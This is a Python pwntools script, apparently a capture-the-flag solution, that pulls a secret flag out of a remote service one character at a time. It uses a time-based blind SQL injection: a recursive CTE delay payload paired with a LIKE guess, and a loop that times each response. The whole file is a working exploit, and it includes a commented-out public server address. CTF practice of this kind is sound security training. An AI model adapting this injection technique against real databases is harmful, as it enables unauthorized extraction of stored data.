from pwn import *
import time

result = ""
black_list = [34, 35, 36, 37, 38]

# flag length: 30
for j in range(30):
    flag = 0
    for i in range(33, 127):
        if i in black_list:
            continue
        p = remote('localhost', 9020)
        # p = remote('110.10.147.146', 9020)
        print(p.recvrepeat(0.1).decode())

        # query = "length(flag)=30"
        query = "flag LIKE '{char}%'".format(char=result+chr(i))

        payload = """WITH RECURSIVE r(i) AS (VALUES(0) UNION ALL SELECT i FROM r LIMIT 5000000) SELECT flag from flag where {query} and 1=(SELECT i FROM r WHERE i = 1);""".replace('\n',' ').format(query=query)
        print(payload)
        t1 = time.time()
        p.sendline(payload.encode())
        
        print(p.recvall().decode())
        t2 = time.time()

        print("time: " + str(t2 - t1))
        if (t2 - t1) > 1.0:
            result += chr(i)
            flag = 1
            print("FLAG: " + result)
            p.close()
            break
    if flag == 0:
        break

p.close()
print("FLAG: " + result)
